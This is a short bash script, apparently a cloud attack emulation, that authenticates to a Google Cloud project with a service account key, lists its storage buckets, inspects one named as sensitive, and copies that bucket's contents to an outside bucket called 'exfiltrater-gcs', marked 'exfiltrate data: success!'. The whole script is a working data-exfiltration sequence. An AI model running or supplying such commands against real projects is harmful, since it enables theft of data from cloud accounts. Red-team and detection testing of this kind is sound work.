#!/usr/bin/env bash

PROJECT_ID="mitre-default"
PROJECT_NUMBER=$(gcloud projects describe ${PROJECT_ID} --format="get(projectNumber)")
gcloud config set project $PROJECT_ID

# authenticate
gcloud auth activate-service-account --key-file key.json

# find buckets in project
gsutil ls -p ${PROJECT_ID}

# check contents in bucket
gsutil ls gs://${PROJECT_ID}-sensitive-ab16/

# exfiltrate data: success!
gsutil -m cp -R gs://${PROJECT_ID}-sensitive-ab16/ gs://exfiltrater-gcs
